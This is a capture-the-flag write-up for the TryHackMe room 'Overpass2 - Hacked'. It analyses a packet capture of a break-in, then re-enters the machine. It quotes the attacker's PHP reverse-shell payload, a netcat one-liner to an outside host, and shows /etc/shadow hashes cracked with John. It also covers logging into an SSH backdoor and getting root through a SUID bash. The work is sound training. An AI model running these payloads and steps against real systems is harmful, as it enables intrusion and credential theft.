@@ -1,0 +1,155 @@
+<title>TryHackMe - Overpass2 - Hacked (Easy)</title>
+<header>
+  <div class="header">
+    <div class="titleContainer">
+      <img class="headerIcon" src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/icon.png"/>
+      <p class="mainTitle">HackTheBox - Overpass2 - Hacked (Easy)</p>
+    </div>
+  </div>
+</header>
+<div class="writeUp">
+<h1 id="table-of-contents">Table of contents</h1>
+<nav id="tableOfContents" class="tableOfContents">
+</nav>
+<h1 id="PCAP file analysis">PCAP file analysis</h1>
+<p>
+  First, let's download the pcap file and open it with Wireshark. On packet number <code>6</code> we can see the HTML source code of <code>/development/</code> wich contains an upload form :
+</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image1.jpg"/>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image2.jpg"/>
+<p><b>Question : What was the URL of the page they used to upload a reverse shell ?</b></p>
+<p>Answer : <code>/development/</code></p>
+<p>Then, we can see in packet <code>14</code> a <code>POST</code> request to <code>/development/upload.php</code>. Let's see what was uploaded in this request :</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image3.jpg"/>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image4.jpg"/>
+<p>We can find the php payload used by the attacker to get a reverse shell.</p>
+<p><b>Question : What payload did the attacker use to gain access ?</b></p>
+<p>Answer : <code>&lt;?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&1|nc 192.168.170.145 4242 &gt;/tmp/f")?&gt;</code></p>
+<p>Looking at packet <code>32</code>, we can see the beginning of a shell session. Probably the reverse shell of the attacker :</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image5.jpg"/>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image6.jpg"/>
+<p>Let's right click this packet and select <code>Follow</code> -> <code>TCP Stream</code> :</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image7.jpg"/>
+<p>We can now see everything the attacker have done using his reverse shell. He used a password to escalate his privileges :</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image8.jpg"/>
+<p><b>Question : What password did the attacker use to privesc ?</b></p>
+<p>Answer : <code>whenevernoteartinstant</code></p>
+<p>We can see the attacker used a backdoor downloaded from Github to establish persistence :</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image9.jpg"/>
+<p><b>Question : How did the attacker establish persistence ?</b></p>
+<p>Answer : <code>https://github.com/NinjaJc01/ssh-backdoor</code></p>
+<h1 id="cracking-etc-shadow-hashes">Cracking /etc/shadow hashes</h1>
+<p>
+  Now, we are asked how many password hashes present in <code>/etc/shadow</code> are crackable using the <code>fasttrack.txt</code> wordlist. The attacker was able 
+  to read <code>/etc/shadow</code>, so we just need to copy all the hashes in a file (one hash per line) :
+</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image10.jpg"/>
+<p>Now we can use <a href="https://www.openwall.com/john/">John</a> to try to crack them :</p>
+<div class="codeBlock">attacker@AttackBox:~$ john hashes.txt -w=fasttrack.txt
+Using default input encoding: UTF-8
+Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE4.1 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+secuirty3        (paradox)     
+secret12         (bee)     
+abcd123          (szymex)     
+1qaz2wsx         (muirland)     
+4g 0:00:00:01 DONE (2022-12-18 19:59) 3.508g/s 194.7p/s 891.2c/s 891.2C/s admin..starwars
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.</div>
+<p><b>Question : Using the fasttrack wordlist, how many of the system passwords were crackable ?</b></p>
+<p>Answer : 4</p>
+<h1 id="analysing-the-backdoor-code">Analysing the backdoor code</h1>
+<p>Let's take a look at <a href="https://github.com/NinjaJc01/ssh-backdoor">https://github.com/NinjaJc01/ssh-backdoor</a>. We can find the default hash in <code>main.go</code> :</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image11.jpg"/>
+<p><b>Question : What's the default hash for the backdoor ?</b></p>
+<p>Answer : <code>bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3</code></p>
+<p>We can also find the hardcoded salt :</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image12.jpg"/>
+<p><b>Question : What's the hardcoded salt for the backdoor ?</b></p>
+<p>Answer : <code>1c362db832f3f864c8c2fe05f2002a05</code></p>
+<p>Now, we have to find what hash was used by the attacker when he set up the backdoor. Let's go back to our pcap file :</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image13.jpg"/>
+<p><b>Question : What was the hash that the attacker used ? - go back to the PCAP for this!</b></p>
+<p>Answer : <code>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</code></p>
+<p>
+  Let's crack this hash and don't forget to add the salt like so : &lt;hash&gt;$&lt;salt&gt;. Also, don't forget to specify the hash type using the <code>--format</code> parameter.
+  You can find the hash type by using online tools like <a href="https://hashes.com/en/tools/hash_identifier">Hashes.com</a> :
+</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image14.jpg"/>
+<p>Now we know it's a SHA512 hash. The format for SHA512 + salt is <code>dynamic=sha512($p.$s)</code> :</p>
+<div class="codeBlock">attacker@AttackBox:~$ echo '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05' > hash.txt
+attacker@AttackBox:~$ cat hash.txt 
+6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05
+attacker@AttackBox:~$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format='dynamic=sha512($p.$s)'
+Using default input encoding: UTF-8
+Loaded 1 password hash (dynamic=sha512($p.$s) [128/128 SSE4.1 2x])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+november16       (?)     
+1g 0:00:00:00 DONE (2022-12-18 21:25) 10.00g/s 184800p/s 184800c/s 184800C/s woodside..nokian70
+Use the "--show --format=dynamic=sha512($p.$s)" options to display all of the cracked passwords reliably
+Session completed. 
+attacker@AttackBox:~$</div>
+<p><b>Question : Crack the hash using rockyou and a cracking tool of your choice. What's the password ?</b></p>
+<p>Answer : <code>november16</code></p>
+<h1 id="taking-control-of-overpass-production-server">Taking control of Overpass production server</h1>
+<p>It is asked to find out what message was left on the web server. Let's take a look using a web browser :</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image15.jpg"/>
+<p><b>Question : The attacker defaced the website. What message did they leave as a heading ?</b></p>
+<p>Answer : H4ck3d by CooctusClan</p>
+<p>We already know the credentials for the backdoor (james:november16), we need to find out on what port the backdoor is running. We can see this in the source code on Github :</p>
+<img src="/write-ups/TryHackMe/Easy/Overpass2 - Hacked/image16.jpg"/>
+<p>Now, we know the backdoor is running on port 2222. Let's connect to it :</p>
+<div class="codeBlock">attacker@AttackBox:~$ ssh james@10.10.5.198 -p 2222
+The authenticity of host '[10.10.5.198]:2222 ([10.10.5.198]:2222)' can't be established.
+RSA key fingerprint is SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[10.10.5.198]:2222' (RSA) to the list of known hosts.
+james@10.10.5.198's password: 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+james@overpass-production:/home/james/ssh-backdoor$</div>
+<p>We are now logged in as james. Let's get the user.txt flag :</p>
+<div class="codeBlock">james@overpass-production:/home/james/ssh-backdoor$ cd ..
+james@overpass-production:/home/james$ ls
+ssh-backdoor  user.txt  www
+james@overpass-production:/home/james$ cat user.txt 
+thm{<mark class="red_text">&lt;REDACTED&gt;</mark>}</div>
+<p><b>Question : What's the user flag ?</b></p>
+<p>Answer : <code>thm{<mark class="red_text">&lt;REDACTED&gt;</mark>}</code></p>
+<p>Now, it's time to get root ! If we look for hidden files in /home/james using <code>ls -la</code>, we can find something interesting :</p>
+<div class="codeBlock">james@overpass-production:/home/james$ ls -la
+total 1136
+drwxr-xr-x 7 james james    4096 Jul 22  2020 .
+drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
+lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
+drwx------ 2 james james    4096 Jul 21  2020 .cache
+drwx------ 3 james james    4096 Jul 21  2020 .gnupg
+drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
+-rw------- 1 james james      51 Jul 21  2020 .overpass
+-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
+-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
+-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
+drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
+-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
+drwxrwxr-x 7 james james    4096 Jul 21  2020 www</div>
+<p>There is a file named .suid_bash that has the SUID bit set and the owner of this file is root... So let's execute it using <code>-p</code> option and see if it works :</p>
+<div class="codeBlock">james@overpass-production:/home/james$ ./.suid_bash -p
+.suid_bash-4.4# whoami
+root
+.suid_bash-4.4#</div>
+<p>And we are root ! Let's get the root flag now :</p>
+<div class="codeBlock">.suid_bash-4.4# cd /root
+.suid_bash-4.4# ls
+root.txt
+.suid_bash-4.4# cat root.txt
+thm{<mark class="red_text">&lt;REDACTED&gt;</mark>}
+.suid_bash-4.4#</div>
+<p><b>Question : What's the root flag ?</b></p>
+<p>Answer : thm{<mark class="red_text">&lt;REDACTED&gt;</mark>}</p>
+</div>
